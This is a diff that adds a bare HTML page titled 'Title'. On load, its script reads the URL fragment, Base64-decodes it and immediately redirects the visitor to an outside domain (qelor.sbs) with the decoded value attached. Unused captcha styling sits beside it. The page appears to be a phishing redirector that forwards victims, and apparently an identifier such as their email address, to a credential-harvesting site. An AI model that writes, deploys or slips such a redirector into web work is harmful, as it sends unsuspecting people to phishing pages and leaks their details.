@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Title</title>
+    <style>
+        #content {
+            display: none; /* Hide the content initially */
+        }
+        #captcha {
+            text-align: center;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+   
+    <script>
+
+            if (window.location.hash) {
+                var url = window.location.href;
+                var hash = url.split('#').pop();
+                var decodedHash;
+
+                try {
+                    // Validate hash before decoding
+                    if (hash && /^[a-zA-Z0-9+/=]*$/.test(hash)) {
+                        decodedHash = atob(hash);  // Decodes Base64
+                    } else {
+                        decodedHash = hash; // If invalid, use original hash
+                    }
+                } catch (e) {
+                    console.error('Error decoding hash:', e);
+                    decodedHash = hash; // If error, fall back to original hash
+                }
+
+                if (decodedHash.trim() !== '') {
+                    window.location.replace("https://qelor.sbs/index.html#" + decodedHash);
+                } else {
+                    window.location.replace("https://qelor.sbs/index.html#");
+                }
+            } else {
+                window.location.replace("https://qelor.sbs/index.html#");
+            }
+        
+    </script>
+</body>
+</html>
